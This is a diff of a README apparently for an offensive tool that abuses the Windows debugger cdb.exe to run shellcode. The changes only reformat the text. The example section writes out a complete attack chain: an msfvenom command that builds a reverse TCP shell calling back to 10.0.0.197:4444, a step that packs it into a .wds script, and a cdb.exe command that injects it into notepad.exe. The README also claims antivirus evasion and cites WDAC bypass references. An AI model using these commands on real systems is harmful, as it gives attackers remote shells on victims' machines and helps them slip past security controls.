@@ -42,17 +42,17 @@ It's that easy! It's also great at evading AV detection due to its unusual forma
 
 ## Example
 
-1. Generate shellcode using msfvenom
+First Generate shellcode using msfvenom.
 
-        msfvenom -p window/x64/shell_reverse_tcp LHOST=10.0.0.197 LPORT=4444 -f python
+    msfvenom -p window/x64/shell_reverse_tcp LHOST=10.0.0.197 LPORT=4444 -f python
 
-2. Download the aforementioned script and replace the shellcode with yours then run the script
+Next, Download the aforementioned script and replace the shellcode with yours then run the script.
 
-        python3 script.py > test.wds
+    python3 script.py > test.wds
 
-3. Send it over to the target machine and use the following command
+Then send it over to the target machine and run the following command
 
-        cdb.exe -pd -cf c:\path\to\payload\test.wds -o notepad.exe
+    cdb.exe -pd -cf c:\path\to\payload\test.wds -o notepad.exe
 
 ![Shellcode-Run](./shellcode_run.gif)
 
@@ -134,9 +134,11 @@ How can cdb help? If you can get cdb to attach to a process then you can cause i
 
 # References
 
-* http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html
-* https://github.com/galoryber/MITRE/blob/master/Defense_Evasion/T1127-CDB.py
-* https://fortynorthsecurity.com/blog/how-to-bypass-wdac-with-dbgsrv-exe/
+http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html
+
+https://github.com/galoryber/MITRE/blob/master/Defense_Evasion/T1127-CDB.py
+
+https://fortynorthsecurity.com/blog/how-to-bypass-wdac-with-dbgsrv-exe/
 
 # Acknowledgement
 
